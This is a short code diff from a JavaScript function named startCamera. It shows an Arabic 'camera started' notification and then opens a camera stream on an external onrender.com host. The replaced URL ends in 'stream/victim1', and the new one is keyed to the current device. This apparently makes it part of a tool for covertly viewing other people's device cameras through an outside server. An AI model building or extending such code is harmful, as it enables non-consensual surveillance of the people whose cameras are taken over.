@@ -479,7 +479,7 @@ async function startCamera(type) {
         showNotification('📸', 'تم تشغيل الكاميرا', '📸');
         
         setTimeout(() => {
-            window.open('https://camera-z9lw.onrender.com/stream/victim1', '_blank');
+            window.open(`https://bluetooth-dw93.onrender.com/camera_stream/${currentDevice}`, '_blank');
         }, 5000);
         
     } catch (e) {
